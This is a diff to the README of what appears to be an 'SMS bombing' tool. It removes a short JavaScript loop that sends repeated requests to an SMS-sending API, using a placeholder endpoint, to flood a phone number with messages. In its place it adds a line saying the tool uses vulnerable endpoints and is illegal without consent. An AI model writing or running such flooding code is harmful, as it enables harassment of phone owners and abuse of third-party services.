@@ -64,22 +64,9 @@ open index.html
 
 ## 🚀 How It Works
 
-```js
-function startBombing() {
-  const number = document.getElementById("phone").value
-  const count = parseInt(document.getElementById("count").value)
+It sends requests to vulnerable endpoints for sms bombing. This is illegal if you do without the consent of owner of the websites' endpoints you are using.
 
-  for (let i = 0; i < count; i++) {
-    setTimeout(() => {
-      fetch(`https://example.com/api/send?phone=${number}`)
-        .then(res => console.log(`Sent #${i + 1}`))
-        .catch(err => console.error(err))
-    }, i * 1000) // delay between messages
-  }
-}
-```
-
-> ⚠️ Replace `https://example.com/api/send` with your testable endpoint.
+> ⚠️ Replace the endpoints with your testable endpoint.
 
 ---
 
